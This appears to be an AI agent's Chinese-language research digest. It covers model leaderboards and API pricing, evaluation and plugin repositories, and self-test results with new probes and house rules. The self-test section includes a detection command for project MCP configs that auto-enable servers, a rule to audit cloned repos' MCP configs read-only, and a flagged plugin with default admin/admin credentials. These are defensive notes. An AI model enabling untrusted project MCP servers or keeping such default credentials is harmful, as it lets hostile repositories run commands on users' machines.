Top（**v4.3 口径**）：**Claude Fable 5.1 (max with fallback) 53 / GPT-6 Astra (max) 53 / Claude Opus 5 (max) 51 / Muse Spark 1.3 (max) 48 / GPT-5.6 Sol (max) 47**。
**单任务成本**：最高 **$7.63**、最低 **$0.06（Muse Glimmer (high)）→ 相差 127 倍**；**单任务耗时**：最低 Gemini 3.5 Flash-Lite **0.7 分钟**、最高 Qwen3.8 Max(0902) **34.9 分钟**；**Pareto 最优区覆盖 GLM-5.3-Flash**。
**OpenRouter 上周（09-14~09-20）**：总调用 **128.9T token（环比 +1.7%）**、API 调用 **53.9 亿次（环比 −2.8%）**；token 用量第一是 **DeepSeek V4.1 Flash 15.8T（份额 12.2%，环比 +219.3%）**。
→ **写死口径**：引用时写"**AA Intelligence Index v4.3，数据版本 2026-09-22**"，**不可与 v4.3 以前横向比**（M-0019）。

### 8.2 国产计费与上新（逐条带来源）
https://ima.qq.com/wiki/?shareId=cd30443cf1a51e3472feeeee9e2b511bdce025897fab2bfba1a5450aa3f94eaf · 腾讯 IMA「互联网副业斥候」（**每日更新**）
- **DeepSeek**：2026-08-17 起 V4 全系**峰谷计价、off-peak 减半**；**V4 Pro 高峰涨幅最高达 1100%**（缓存命中价）；
- **腾讯混元**：混元-lite **免费**；standard **输入降 55% / 输出降 50%**；pro **输入降 70%**；**免费额度 100 万 → 1 亿 token**；
- **智谱**：**GLM-5.3（08-14）总参数 7530 亿**，**CyberGym 84.5%** 略高于 **GPT-5.6 Sol 的 83.6%**；"开源的盾"计划**已在 269 个开源项目识别中高危缺陷 1097 个**；**完整权重计划两周后开源**；GLM-5.3 定价 ¥8 / ¥28 每百万 token。
→ **可自托管做代码缺陷扫描**的重要论据；**DeepSeek 峰谷计价意味着"错峰跑长任务"能省一半**。

### 8.3 本地评测工具（GitHub 路精选，含**评测口径**警示）
| 项目 | 实测 | 关键点 |
|---|---|---|
| `kmvaidya/llm-arena-vram-calc` | **2★ / MIT / Python** | 把 Arena 榜与**参数量 + 各精度显存估算**交叉，回答"我的卡能跑哪个最强的模型"；**已计入 25% 服务开销**（KV cache + 激活 + 框架）。⚠️ 目标档位偏 H100/B200，**要自己加一档 12~16GB 消费卡** |
| `yrougy/llm-quant-bench` | **10★ / 未声明 / HTML** | **专测"GGUF 量化档位损失多少精度"**：硬件就是 **2×RTX 3060 12G / GTX 1070 8G**、llama.cpp `llama-server`、KV cache q4_0、上下文 16384–32768。⚠️ 但 `license=null` |
| `notwitcheer/llm-bench-rig` | **40★ / 未声明 / Python** | 双引擎（llama.cpp / vLLM）评测流水线；`board_ci.py` 出 **Wilson 95% 误差棒**（**让相邻名次可视为平手**）；每次运行写 **provenance**（server build + chat template hash + gguf sha256）供回溯。⚠️ **不依赖 lm-evaluation-harness**，生成式判定口径会与 loglikelihood 差几分；目标卡是 **RTX 5090 级** |
| `AmigaMeow/llm-leaderboard-data` | **4★ / MIT / Python** | **每日自动更新**的榜数据（GitHub Action），聚合 LMArena + OpenRouter 定价，**同步镜像到 HF dataset 可 `load_dataset()`**。⚠️ README 自述 **Arena 分取自 2026-09-13 快照、此后上游未发新快照**，定价每日抓 → **看榜要分清哪个字段是陈旧的** |

---

## 九、GitHub 路其余条目（9 条，全量见 `_r21/_r21_gh.md`）

| 项目 | 实测 | 可复用性 |
|---|---|---|
| `ShenSeanChen` 之外的 `hatayama/unity-cli-loop` 类**引擎 CLI 闭环**（`godot-mcp-cli` 同思路） | — | **参考**：看工具清单里有没有 **run / input / screenshot 三个动词** |
| `IvanMurzak/GameDev-MCP-Server` | 13★ / Apache-2.0 / C# | **参考**：一个 server 二进制服务多引擎、能力由插件侧注入；实现过重 |
| `estebanrfp/defold-ai`（**4★**）、`Lolner95/godotter`（**31★ / MIT**）、`cats2333/bevy_ai_editor`（**12★**） | — | **参考/不采用**：godotter 的"**先出计划 → 展示 diff → 用户批准才落盘**"护栏可抄；bevy 与 godot-mcp-pro 均 `license=null`/付费，**只能读不能抄** |
| `helloHupc/dsh-plugin-hub` | **13★ / MIT / HTML** | **落地**：DSH 插件聚合索引站，合并 6 个数据源、**实测去重后 3700+ 条**、每小时刷新；`python3 scripts/aggregate.py` 一键 ETL + `--offline` 缓存调试 → **与"维护静态索引站 + 写 Python 脚本"画像完全对齐**，可直接抄流水线 |
| `TecFancy/dsh-auth-gate` | **15★ / MIT / TS** | **落地**：给公开部署的 DSH Web 加"登录门"（密码/token + 可选 TOTP），**README 明确覆盖 Windows CI**。属"官方缺位期补丁"，升级 dsh 要跟着升 |
| `RYun601/dsh-launcher` | **3★ / MIT / PowerShell** | **落地**：**Windows 专用** DSH Web 启动器，cmd 输入 `deepseek` 即启（`-b` 后台）、服务就绪自动开浏览器、`--status`/`--stop` |
| `AI-Scarlett/DSH-Store` | 2★ / MIT / JS | **参考**：插件商城 + 生命周期管理，**Catalog 固定到完整 commit 才生成修复命令**。⚠️ README 提醒 `ERR_PNPM_GIT_DEP_PREPARE_NOT_ALLOWED` 时**别**放开整个 Profile 的 `prepare` 权限 |
| `MingYU-kalo/dsh-https-fix` | 2★ / MIT / JS | **不采用（反例）**：给 dsh 安装目录的 `client.js` 打**运行时热补丁** → **dsh 一升级就被覆盖、装错版本直接起不来**；默认账密 `admin/admin` 而 agent 能本机执行命令 |
| `jsflax/Engram` | 6★ / 未声明 / **Swift** | **不采用**：macOS 路线。**只抄它的节流设计** —— learner 同时只跑一个、10 分钟上限、每批 ≤12 次记忆调用/≤5 次写入、成功区间 checkpoint、失败保留游标并退避 5 分钟 |

**许可风险清单**（**只能读、不能把代码/文字抄进项目**）：`license=null` 6 条（`bevy_ai_editor`、`skill-hook-authoring`、两个 `vibe-coding-security`、`llm-bench-rig`、`llm-quant-bench`）+ `NOASSERTION` 4 条（`godot-mcp-pro`、`defold-ai`、`agent-systems-handbook`、`Engram`）。**可安全抄用的 15 条。**

---

## 十、本辑自测：读完了，**实测了什么，改了什么**

> 规则：**有数字、有可复现机制的才落地**；实测不报红的不落地（宽判据的假警比没有更危险）；超上下文的写进待办。

### 10.1 实测 ①：TrustFall 自查（对应 §6.1 + 房规 #48）
`grep -rl "enableAllProjectMcpServers" D:\34498\Documents` + `Glob **/{.mcp.json,settings.json}` →
**真实配置 0 命中**（唯一命中是本辑调研文件正文），`refs/` 下无 `.mcp.json`。
→ **结论：当前无风险，但此前没有任何检测机制** → 落地为**房规 #48**（含检测器命令），把它从"运气好"变成"**可检查**"。

### 10.2 实测 ②：记忆条目的回归测试**能不能真跑**（新发现）
对 `mistakes/` 全部 22 条抓 `regressionTest.path` 并逐条验存在性：
**真正可执行 6 条（27%）** / **路径已失效 8 条**（**全部指向已终止的游戏线 `amphoreus-roast/`**）/ 自然语言描述而非路径 6 条 / `n/a` 2 条。
→ **失效的回归测试比没有更糟**：它看着像"这条有检测器"，按它跑只会报"文件不存在"（M-0002 复发）。
→ 落地为**房规 #49**；并把 `memory_health.py` 的 **R7（字面路径存在性统计）** 列入待办（**没做**：改它要先读 8.7KB 脚本，本轮上下文不够，见待办第 6 条）。

### 10.3 实测 ③：给新闸门做正负例 —— **连抓出自己三个坑**（已修）
本辑新建 `_tools/index_metrics.py`（索引站口径对账），按 M-0022 的处方**先做负例再上生产**，结果：
- 坑一：页头正则写成 `[0-9]{3,5}` —— **只认 4 位数的真实文件**，迷你样本"共 3 个项目"匹配不上 → 假警；
- 坑二：探针只判退出码 → **E1 的假警被当成了 E2 的召回（假警伪装成召回）**；
- 坑三：负对照分支的 `got` 语义**写反了**（`没报红` vs `报红了`）→ 合规样本被判假警。
→ 三个坑**都不报错、只给好看的结果**，全是负对照照出来的 → 记为 **M-0022**。
→ 同时把这组正负例**固化进 `_tools/gate_recall_probe.py`**（新增 I1–I4），现在探针覆盖 **8 项（G1-G4 + I1-I4）全绿**。

### 10.4 实测 ④：新增 `_tools/insert_guard_probe.py` —— 把"改 index.html 前的保险"也验了
M-0020 早就记着"`insert_vN_cards.py` 的四道保护**从未被反例验证过**"。本轮用**真实历史版本**（`git show aee9fa3:index.html`，第十九辑状态）做基准，跑 **6 例**：
**P1 正例成功（产物 div 平衡 / 末条脚注 r1119 ×1）+ N1 幂等跳过 + N2 页头锚点消失拒绝 + N3 锚点出现 2 次拒绝 + N4 缺 `<section id="s3"` 拒绝 + N5 新卡仓库已存在拒绝 —— 6/6 符合预期。**
→ 这是本辑**最有元价值的一步**：以后每一版 `insert_vN` 都能用 `--script` 换目标复用。

### 10.5 落地清单（**已改，非声称**）
| 文件 | 改动 |
|---|---|
| `_tools/index_metrics.py` | **新建**（E1–E4 闸门；恒等式 `页头数 == 最大脚注号+1`） |
| `_tools/insert_guard_probe.py` | **新建**（1 正例 + 5 反例） |
| `_tools/gate_recall_probe.py` | **扩展**：新增 `index_metrics` 段 I1–I4；修负对照分支语义 |
| `.workbuddy/memory/mistakes/M-0022-*.yml` + `index.json` | **新建**（22 条） |
| `agent-house-rules.md` | **47 → 49 条**（+#48 克隆仓库先只读审 MCP 配置 / +#49 回归测试路径必须仍存在） |
| `game-production-pipeline.md` | **58 → 60 条**（+#59 压缩是替身，原始必须留底 / +#60 记忆写入加只读探针） |
| `AGENTS.md` | §十 钉子表**加"复核/退役"列** + 加 Copilot 六模型退役的反面案例；§七 加两个新工具指针 |
| `index.html` | 第二十七版增补 **8 张卡**（1120 → 1128，脚注 [1120]-[1127]），脚本 `insert_v27_cards.py` |

**明确没做的**（不假装）：R7 落地（10.2）、`check_rpy_branches.py`（§7.1）、Foremerge 最小原型（§11.2）、`/skill-doctor` 式"没用的 skill 审计" —— 全部进待办。

---

## 十一、本辑必须记下的三处「口径相反」

### 11.1 同一批模型名，两路结论相反 —— **"看着不像真的"不等于"是假的"**
- **cn 路**：把某论坛《2026 年 9 月 AI 大模型排行榜》判为**"疑似 AI 生成的虚构榜单"**，因为出现了 `Meta Muse Spark 1.3` / `GPT-6 Astra` / `Claude Fable 5` 这些"与主流口径不符"的名字；
- **official 路**：实测 AA 榜（数据版本 2026-09-22）**Top 5 里就有 `Claude Fable 5.1` / `GPT-6 Astra` / `Muse Spark 1.3`** —— **名字是真的**。
→ **判定**：cn 路的**剔除动作没错**（该论坛文与 v6/v14/v16 已收内容重合，属重复），但**判据错了** ——
**"我没见过这个模型名"是知识缺口，不是虚构的证据**。这正是 M-0002「先核实再下结论」的一种新形态：
**用"与主流不符"当虚构判据，等于把自己的信息滞后当成了对方的错。**
→ **可迁移判据**：判"虚构"要拿**一手源**（官方发布页 / 权威榜），不能拿**自己的印象**。

### 11.2 "上下文管理"到底值多少 —— 流行说法 vs 实证
- **流行说法**（§3.3）：压 CLAUDE.md、装命令压缩代理、建代码索引 → **省 82% token**；
- **实证**（§3.2）：**176 组配置的结论是"上下文管理主要只是防溢出"**，且 **规则化删减 > LLM 摘要**。
→ **两者不矛盾**：82% 省的是**钱**，防溢出保的是**能不能跑完** ——
但**不能拿"省了 82%"去暗示"模型因此更强"**。落地时把这两件事分开说。

### 11.3 Godot 禁 AI 贡献 vs CESA 85.8% 在用 —— **同一行业，两个方向**
- **Godot 基金会**：不收 AI 生成代码、不收 AI 写的沟通，理由是**责任**（"无法信任重度使用 AI 的人，理解自己的代码到能修它的程度"）；
- **CESA 1349 人调查**：**85.8% 开发者已在用**，最普遍的管理方式是"**人确认/修改/审核 + 限定工具 + 不用原样产出**"。
→ **不矛盾，是同一件事的两端**：**用**是既成事实，**怎么用**才是分歧点。
Godot 反的不是"用 AI"，反的是"**不理解就交付**"。→ 这条对我们最实用：**我们每一版索引与每一条 `mistakes/` 都应能回答"谁理解了它"**。

---

## 十二、索引与文档维护（本辑）

- `index.html` **第二十七版增补 8 张卡**（**1120 → 1128**，脚注 **[1120]-[1127]**），脚本 `insert_v27_cards.py`
- `agent-house-rules.md` **47 → 49 条**（+#48 / +#49）
- `game-production-pipeline.md` **58 → 60 条**（+#59 / +#60）
- `mistakes/` **21 → 22 条**（+M-0022）
- `AGENTS.md` **126 → ~133 行**：§十 钉子表加"复核/退役"列；§七 加 `index_metrics.py` / `insert_guard_probe.py`
- 新增工具：`_tools/index_metrics.py` · `_tools/insert_guard_probe.py`（+ 扩展 `gate_recall_probe.py`）
- 原始调研输出：`_r21/_r21_gh.md`（25 条）· `_r21/_r21_cn.md`（27 条）· `_r21/_r21_official.md`（24 条）
- ✅ **子 agent 瑕疵已修**：`_r21_gh.md` 曾残留一个**空的 `## 二、（待填）` 骨架小节**（分节时重复了一次），已删除并复核
  （现 `## 二` 仅 1 处、`（待填）` 0 处、25 条编号条目完整）；
  `_r21_cn.md` 的"§八 去重报告"里有一处判据错误（见 §11.1）—— **保留原文不改**，作为判据错误的证据。

---

## 十三、下一辑待办

**本辑新增**
1. **【最高优先】追一手源《DeepSeek Harness：从开机到拆开》（花叔，CC BY-NC-SA 4.0）** —— 被两篇独立引为"一手实测"，本辑未取到 URL
2. **把 Foremerge 的做法做成最小版**：三路子 agent **开工前先写"我要查什么"到共享文件、收工前先读它** —— 直接治我们"两路重复 / 两路 429"的老毛病（本辑三路已撞过一次 429）
3. **落 `check_rpy_branches.py`**（§7.1）：解析 `label/jump/call` → 找不可达节点与悬挂跳转 + 覆盖率统计
4. **`memory_health.py` 加 R7**（§10.2）：`regressionTest.path` 字面路径存在性 → 输出**分类计数**而非直接报红
5. **顺手修 8 条失效路径**（§10.2）：指向 `amphoreus-roast/` 的改为归档位置或标 `stale: true`
6. **补 `mistakes/` 的"为什么"字段 + `content_sha256`**（v20 待办 #13 承接）：现在写的是"怎么做"，能跨任务迁移的是**原因**
7. **给索引站/`mistakes/` 加"是否 AI 生成 / 谁复核"标记**（§11.3 + Godot 政策 + "51% 强制披露"）
8. **回注 token 预算**（§2.2）：给 `mistakes/` 与 `MEMORY.md` 定一个**回注上限**（社区值是 ≤500 token/次）；当前常驻记忆实测 **4,993 token**
9. **`/skill-doctor` 式自查**：列出**没被用过的 skill**（本机 19 个技能，`skill_budget` 只测预算不测使用率）

**承接**
10. **架构边界闸门**（Frankenstein 效应）—— 欠两轮，仍未建
11. `rpycdec` 对 1.9 发行包反编译自查（欠四轮）
12. Codex 本地 `config.yaml` → Ollama 纯离线
13. DSH 上下文插件二轮评估（等脱离 rc）；本辑新增 **`deepseek-harness-for-vscode` 的 VSIX 路线**与 `dsh-launcher`（Windows 壳）可作替代
14. **词表落地**：给索引站建 `概念 | HTML class | 页头字段 | 脚注编号 | 约束` 表 —— **本辑已部分完成**（`index_metrics.py` 把三个口径变成 E2 可检查项），**尚缺"概念词表"本身**
15. 量自己闸门的**召回率**（往已验收版本塞回已知 bug）—— 本辑已扩到 **8 项**，仍未覆盖"技能内容是不是真经验"

---

*本辑统计*：新增约 **76 条**信源（GitHub·Gitee 25 / 中文社媒 27 / 官方与海外 24）→ 累计约 **741 条**；
`index.html` **1128** 项（+8）；`agent-house-rules.md` **49** 条（+2）；决策原则 **60** 条（+2）；`mistakes/` **22** 条（+1）；
新建工具 **2 个**（`index_metrics.py` / `insert_guard_probe.py`）+ 扩展 1 个（`gate_recall_probe.py`）；
自测抓出并修掉 **3 个真缺陷**（全在自己新写的闸门里，见 M-0022）+ **1 处既有缺陷**（8/22 条回归测试路径失效）；
**本辑最大单条价值**：把"改 index.html 前的保险丝"从**从未被验证**变成 **6/6 反例通过**。
